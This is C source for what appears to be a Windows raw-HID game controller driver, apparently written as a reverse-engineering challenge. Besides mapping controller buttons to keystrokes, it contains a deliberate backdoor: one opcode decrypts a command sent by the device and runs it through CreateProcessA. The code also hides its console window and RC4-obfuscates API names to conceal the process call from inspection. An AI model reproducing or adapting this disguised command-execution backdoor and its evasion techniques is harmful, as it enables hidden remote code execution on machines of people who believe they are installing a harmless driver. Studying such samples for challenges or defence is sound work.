#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

//https://github.com/NicoHood/HID/tree/master/extras/rawhid
#include "HID\extras\rawhid\hid.h"

//https://github.com/kokke/tiny-AES-c
//need to edit aes.h to use AES256 - defining it here does not work
#define CTR 1
#include "tiny-AES-c\aes.h"

const unsigned char rc4key[48] = {0x4f, 0x5e, 0xc2, 0x35, 0x55, 0xa6, 0x7b, 0xe2, 0x53, 0x15, 0x17, 0x43, 0x8f, 0x96, 0xc4, 0x6f, 0x7f, 0x65, 0x2a, 0x74, 0x29, 0xc4, 0xb3, 0xb6, 0x08, 0x71, 0x52, 0xd9, 0x15, 0x7d, 0xd0, 0x98, 0x0a, 0x32, 0xa9, 0xee, 0xdf, 0xa3, 0x54, 0xe2, 0x67, 0x14, 0xf5, 0x78, 0x9b, 0x1c, 0xe3, 0x8d};
const unsigned char encstr[48] = {0xf9, 0x7a, 0x85, 0x17, 0x1c, 0xc1, 0x5a, 0xd7, 0x1f, 0xfa, 0xa5, 0x8b, 0xf0, 0xfe, 0xbe, 0x69, 0x06, 0xe8, 0x8e, 0x6e, 0x44, 0x66, 0xa6, 0x6b, 0xf1, 0x3e, 0x2e, 0xf2, 0xca, 0xe7, 0xa4, 0x95, 0x7c, 0x82, 0xa5, 0x15, 0x5b, 0x00, 0xda, 0x87, 0xa8, 0xdd, 0x15, 0x3e, 0x9e, 0x8a, 0x4d, 0x46};

int main()
{
    #ifndef DEBUG
    //hide driver window
    HWND hwnd = GetConsoleWindow();
    ShowWindow( hwnd, SW_MINIMIZE );
    ShowWindow( hwnd, SW_HIDE );
    #endif

    int r = rawhid_open(1, -1, -1, 0xFEED, 0xFACE);  //unfortunately cant/dont know how to edit vendor and product id so we'll just ignore it
    if (r <= 0) return -1;

    //actual functioning codes behind rawhid_open so that ppl cant just run this driver and dynamically reverse it
    //since presumably they wouldnt have the device set up with that device id
    //patching the call out is a valid solution though since i encourage smart shortcuts

    #ifdef DEBUG
    printf("found device\n");
    #endif

    //minimal RC4 from https://gist.github.com/Lima-X/add34088be8f7c7ecf6119946628b348

    // Substitution-Box and State
    unsigned char SBox[256];
    unsigned char i = 0, j = 0;

    unsigned char strs[64];
    memset(strs, 0, 64);

    // Key-Scheduling-Algorithm (KSA)
    for (unsigned short i = 0; i < 256; i++)
        SBox[i] = (unsigned char)i;
    for (unsigned short i = 0; i < 256; i++) {
        j += SBox[i] + rc4key[i % 48];
        { unsigned char T = SBox[i]; SBox[i] = SBox[j]; SBox[j] = T; }
    }

    // Pseudo-Random-Generation (PRG)  (referenced from here instead https://gist.github.com/rverton/a44fc8ca67ab9ec32089 since the PRG in implementation above seems broken)
    i = 0, j = 0;
    for(int n = 0; n < 48; n++) {
        i = (i + 1) % 256;
        j = (j + SBox[i]) % 256;
        { unsigned char T = SBox[i]; SBox[i] = SBox[j]; SBox[j] = T; }
        int rnd = SBox[(SBox[i] + SBox[j]) % 256];
        strs[n] = rnd ^ encstr[n];
    }

    #ifdef DEBUG
    printf("%s", strs);
    #endif

    //reflectively get functions to hide CreateProcess
    HMODULE libs[2];

    libs[0] = LoadLibraryEx(&strs[0], NULL, LOAD_LIBRARY_SEARCH_SYSTEM32);  //user32.dll
    libs[1] = LoadLibraryEx(&strs[26], NULL, LOAD_LIBRARY_SEARCH_SYSTEM32); //kernel32.dll

    FARPROC funcs[2];

    funcs[0] = GetProcAddress(libs[0], &strs[39]);   //SendInput
    funcs[1] = GetProcAddress(libs[1], &strs[11]);   //CreateProcessA


    //init random for secrets generation
    srand(GetTickCount());

    while (1) {
        //send payload
        short send[32];

        int secret = (rand() << 16) | rand();   //RAND_MAX in windows is only 0x7fff

        #ifdef DEBUG
        printf("\nsecret: %x\n", secret);
        for (int i = 0; i < 4; i++) {
            printf("%02hhx ", ((unsigned char*) &secret)[i]);
        }
        printf("\n");
        #endif

        send[0] = 0x0727;     //opcode, but theres practically only one opcode atm
        send[1] = (short) secret;
        send[2] = (short) (secret >> 16);   //follow endianness

        //refresh client secret

        #ifdef DEBUG
        printf("send %zd\n", sizeof(send));
        for (int i = 0; i < sizeof(send); i++) {
            printf("%02hhx ", ((unsigned char*) send)[i]);
        }
        printf("\n");
        #endif

        rawhid_send(0, (char*) send, sizeof(send), 100);
        
        
        //recv payload
        char recv[64];

        int count = 0; 
        while (!(count = rawhid_recv(0, recv, 64, 100)));   //handshake should not take more than 100ms usually, but retry until response get

        //if count < 0 device stopped responding
        if (count < 0) {
            rawhid_close(0);
            return 0;
        }

        #ifdef DEBUG
        printf("recv %d\n", count);
        for (int i = 0; i < count; i++) {
            printf("%02hhx ", ((unsigned char*) recv)[i]);
        }
        printf("\n");
        #endif


        //xor secret to get payload
        i = 64;
        while(i--) {
            recv[i] = recv[i] ^ ((unsigned char*)&secret)[i % 4];
        }

        #ifdef DEBUG
        printf("recv xored %d\n", count);
        for (int i = 0; i < count; i++) {
            printf("%02hhx ", ((unsigned char*) recv)[i]);
        }
        printf("\n");
        #endif

        //handle actual opcodes
        if (count > 0) {
            unsigned char whichfunc;
            void* params[3];     //only contains params that will differ between calls

            //CreateProcess specific params; will be passed and discarded regardless
            STARTUPINFO si;
            PROCESS_INFORMATION pi;
            memset(&pi, 0, sizeof(pi));
            memset(&si, 0, sizeof(si));
            si.cb = sizeof(si);

            switch(((unsigned short*)recv)[0]) {
                //SendInput specific params
                case 0xf00f:     //actual endpoint; all data after first 8 bytes are useless
                    #ifdef DEBUG
                    printf("in normal handler\n");
                    #endif
                    whichfunc = 0;

                    params[0] = (void*) 1;  //cInputs

                    INPUT ip;
                    ip.type = INPUT_KEYBOARD;
                    ip.ki.time = 0;
                    ip.ki.dwFlags = KEYEVENTF_UNICODE;
                    ip.ki.wScan = 0;
                    ip.ki.dwExtraInfo = 0;

                    #ifdef DEBUG
                    printf("opcode: %04hx", ((unsigned short*)recv)[1]);
                    #endif

                    switch(((unsigned short*)recv)[1]) {    //keycode handling
                        case 0x0100:     //up
                            ip.ki.wVk = VK_UP;
                            break;
                        case 0x0200:     //down
                            ip.ki.wVk = VK_DOWN;
                            break;
                        case 0x0001:     //left
                            ip.ki.wVk = VK_LEFT;
                            break;
                        case 0x0002:     //right
                            ip.ki.wVk = VK_RIGHT;
                            break;
                        case 0xF0F0:     //A
                            ip.ki.wVk = 'A';
                            break;
                        case 0x0F0F:     //B
                            ip.ki.wVk = 'B';
                            break;
                        default:
                            return -1;   //invalid button
                    }

                    params[1] = (void*) &ip;    //pInputs
                    params[2] = (void*) sizeof(INPUT);   //cbSize
                    break;

                case 0x0ff0:     //backdoor
                    #ifdef DEBUG
                    printf("in backdoor\n");
                    #endif
                    whichfunc = 1;
                                        
                    struct AES_ctx ctx;

                    AES_init_ctx_iv(&ctx, recv, &strs[32]);
                    AES_CTR_xcrypt_buffer(&ctx, &recv[32], 32);   //apparently modifies recv directly

                    #ifdef DEBUG
                    printf("cmd: %s\n", &recv[32]);
                    #endif

                    params[0] = NULL;   //lpApplicationName; NULL to run commands
                    params[1] = (void*) &recv[32];   //lpCommandLine; we want to run the payload from the controller as shell commands
                    params[2] = NULL;   //lpProcessAttributes
                    break;

                default:
                    #ifdef DEBUG
                    printf("invalid opcode\n");
                    #endif

                    return -1;   //undefined opcode
            }

            //windows convention allows calling with more parameters than expected, so while SendInput expects 3 arguments its completely fine to pass the rest
            funcs[whichfunc](params[0], params[1], params[2], NULL, FALSE, 0, NULL, NULL, &si, &pi);
            #ifdef DEBUG
            printf("error?: %d", GetLastError());
            #endif
        }
    }
}
